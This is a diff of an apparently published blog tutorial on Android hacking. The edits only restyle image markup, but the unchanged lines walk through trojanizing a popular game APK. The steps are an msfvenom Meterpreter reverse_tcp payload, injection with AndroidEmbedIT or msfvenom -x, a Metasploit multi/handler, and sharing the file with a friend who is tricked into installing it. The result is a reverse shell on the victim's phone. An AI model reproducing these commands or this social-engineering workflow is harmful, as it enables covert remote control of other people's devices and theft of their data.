@@ -44,7 +44,7 @@
 <p><em><strong>Friend:</strong> Bro, can you please download it for me? I'm having internet issues. You can share with me via file-sharing app or any other means.</em></p>
 <p><em><strong>You:</strong> Sure, why not..!!</em></p>
 
-<p><img width="279" height="250" src="https://media0.giphy.com/media/8FJjDVGHSOk7PExGeu/giphy.gif?cid=de9bf95eokz160yfe32o7mrzw7ujk1j1swjy8r93z8rmclxs&amp;rid=giphy.gif&amp;ct=g" alt="scheming rooster teeth GIF by Achievement Hunter (GIF Image)"></p>
+<p class="has-text-align-center"><img width="279" height="250" src="https://media0.giphy.com/media/8FJjDVGHSOk7PExGeu/giphy.gif?cid=de9bf95eokz160yfe32o7mrzw7ujk1j1swjy8r93z8rmclxs&amp;rid=giphy.gif&amp;ct=g" alt="scheming rooster teeth GIF by Achievement Hunter (GIF Image)"></p>
 
 <p><em><strong>Note:</strong> Assuming attacker(you) and victim(friend) are on the same network here.</em></p>
 
@@ -54,7 +54,7 @@
 
 <p><strong>#<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;local-ip-address&gt; LPORT=&lt;any unused port&gt; -f raw &gt; malicious-android.apk</code></strong></p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-create-payload.png?w=936" alt="" class="wp-image-129"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-create-payload.png?w=936" alt="" class="wp-image-129"/></figure></div>
 <br>
 
 <p><strong>Step-2: Download AndroidEmbedIT script from Github</strong></p>
@@ -63,7 +63,7 @@
 
 <p><strong>#<code>git clone https://github.com/yoda66/AndroidEmbedIT</code></strong></p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/andrrod-embedit-folder.png?w=837" alt="" class="wp-image-157"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/andrrod-embedit-folder.png?w=837" alt="" class="wp-image-157"/></figure></div>
 <br>
 <p>Now, there are some dependencies need to be installed before launching the script. Here is the list and commands to install the dependencies.</p>
 
@@ -75,7 +75,7 @@
 
 <strong>#<code>python3 android_embedit.py -h</code></strong>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-scrpt-help-1.png?w=762" alt="" class="wp-image-131"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-scrpt-help-1.png?w=762" alt="" class="wp-image-131"/></figure></div>
 
 <p>As you can see from the arguments, script requires key details(not required), a legitimate apk and msf apk (malicious apk).</p>
 
@@ -83,7 +83,7 @@
 
 <p>Here, a widely-used android game <strong>Fruit Ninja</strong> apk is downloaded for your friend.</p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/com.fruitninja-android.png?w=723" alt="" class="wp-image-132"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/com.fruitninja-android.png?w=723" alt="" class="wp-image-132"/></figure></div>
 
 <p>Now, we have our both APKs. One is com.fruit-ninja.apk (legitimate application) and the other malicious-android.apk (malicious application).</p>
 
@@ -91,7 +91,7 @@
 
 <strong>#<code>python3 android_embedit.py com.fruit-ninja.apk malicious-android.apk</code></strong>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-successful.png?w=726" alt="" class="wp-image-133"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/embedit-successful.png?w=726" alt="" class="wp-image-133"/></figure></div>
 
 <p>As you can see that the final.apk is created. That means, the apk is properly compiled and signed, hence successfully embedded.</p>
 
@@ -103,14 +103,15 @@
 
 <p>Now, launch the metasploit framework using msfconsole. Once the Metasploit framework is launched, you need to use multi/handler, which is a stub that handles exploits launched outside of the framework. Set the same payload, IP address and port which you used while creating the malicious payload in Step-1.</p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/meterprter-exploit-handler.png?w=655" alt="" class="wp-image-140"/>
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/meterprter-exploit-handler.png?w=655" alt="" class="wp-image-140"/></figure></div>
 <br>
 
 <p><strong>Step-5: Host the Latest APK and Share the URL to Your Friend to Download</strong></p>
 
 <p>As learned from the previous blog <a href="https://vinagrsec.github.io/android-hacking-part-1">Part-1</a>, you need to host the latest apk using <strong>SimpleHTTPServer</strong>. Share the URL to your friend, for e.g. http://your-local-ip:8080/fruit-ninja.apk. He will run in his browser's address bar and apk will be downloaded automatically. He can install the application now.</p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2-mod.jpg.png?w=604" alt="" data-id="171" data-full-url="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2-mod.jpg.png" data-link="https://vinagrsec.wordpress.com/combined-installed-apk-1-2-mod-jpg/" class="wp-image-171"/>
+<figure class="wp-block-gallery aligncenter columns-1 is-cropped"><ul class="blocks-gallery-grid"><li class="blocks-gallery-item"><figure><img src="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2-mod.jpg.png?w=604" alt="" data-id="171" data-full-url="https://vinagrsec.files.wordpress.com/2021/10/combined-installed-apk-1-2-mod.jpg.png" data-link="https://vinagrsec.wordpress.com/combined-installed-apk-1-2-mod-jpg/" class="wp-image-171"/></figure></li></ul></figure>
 
 <br>
 <p><strong>Step-6: Magic Time!</strong></p>
@@ -124,7 +125,7 @@
 
 <p><em><strong>Et Voilà !</strong></em></p>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/meterpreter-sesssion.png?w=940" alt="" class="wp-image-142"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/meterpreter-sesssion.png?w=940" alt="" class="wp-image-142"/></figure></div>
 
 <p>Now as learned from the previous blog, type "help" and you can play around and do some stupid stuffs.</p>
 <br>
@@ -138,7 +139,7 @@
 
 <strong>#<code>msfvenom -x com.fruit-ninja.apk -p android/meterpreter/reverse_tcp LHOST=&lt;your-local-ip&gt; LPORT=&lt;your-local-port&gt; -f raw &gt; fruit-ninja2.apk</code></strong>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-x-1-zipalign-error.png?w=1024" alt="" class="wp-image-148"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/msfvenom-x-1-zipalign-error.png?w=1024" alt="" class="wp-image-148"/></figure></div>
 
 <p><em>Here, -x denotes template, that means you need to specify a custom executable file to use as a template.</em></p>
 
@@ -146,7 +147,7 @@
 
 <strong>#<code>apt install zipalign</code></strong>
 
-<img src="https://vinagrsec.files.wordpress.com/2021/10/zipalign-install.png?w=820" alt="" class="wp-image-150"/>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://vinagrsec.files.wordpress.com/2021/10/zipalign-install.png?w=820" alt="" class="wp-image-150"/></figure></div>
 
 <p>Now, run the msfvenom command again and you can observe from the logs that the procedure is being used here is same as it was in Method-1.</p>
 
